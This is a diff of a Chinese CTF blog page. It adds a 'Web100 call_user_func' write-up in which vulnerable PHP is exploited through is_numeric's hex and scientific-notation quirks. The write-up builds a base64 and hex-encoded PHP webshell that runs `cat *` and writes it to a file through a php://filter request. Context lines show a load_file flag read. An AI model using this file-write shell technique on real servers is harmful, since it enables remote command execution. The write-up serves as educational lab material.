@@ -108,6 +108,13 @@
       </li>
       
       <li>
+        <a href="/categories/Crypto">
+          
+          <span>Crypto</span>
+        </a>
+      </li>
+      
+      <li>
         <a href="/categories/%E5%89%8D%E7%AB%AF">
           
           <span>前端</span>
@@ -253,6 +260,14 @@
                   <a href="/categories/Reverse " style="margin-left:75px">
 				  
 		          <span>Reverse</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Crypto " style="margin-left:75px">
+				  
+		          <span>Crypto</span>
                   </a>
                 </li>
               
@@ -514,21 +529,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-13
+                    2021-10-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.1k
+                    2.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    12 分
                 </div>
                 
 
@@ -956,6 +971,45 @@ c<span class="token operator">=</span><span class="token keyword">try</span> <sp
 <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span>
 <span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Web100-call-user-func"><a href="#Web100-call-user-func" class="headerlink" title="Web100 call_user_func"></a>Web100 call_user_func</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+ 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>is_numeric:指定的变量是<strong>数字</strong>和<strong>数字字符串</strong>(字符串内全是数字)则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即TRUE</p>
+<p>7.x：<code>is_number()</code>对16进制数字不返回TRUE</p>
+</blockquote>
+<p>所以转换成能够返回True的数字字符串。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;&#96;cat *&#96;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>进行base64编码：</p>
+<pre class="line-numbers language-none"><code class="language-none">PD89YGNhdCAqYDs&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>去掉补位的<code>=</code></p>
+<pre class="line-numbers language-none"><code class="language-none">PD89YGNhdCAqYDs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>转换为16进制</p>
+<pre class="line-numbers language-none"><code class="language-none">5044383959474e6864434171594473<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>base64编码为<code>a-zA-Z0-9/=</code>，大部分为数字，所以得碰运气。而且<strong>如果中间有字母e，那么完全会被is_numberic当成科学计数法</strong>。</p>
+<p>所以尽量凑出中间有e的纯数字字符串。</p>
+<pre class="line-numbers language-none"><code class="language-none">GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php
+ 
+POST:v1&#x3D;hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
                 
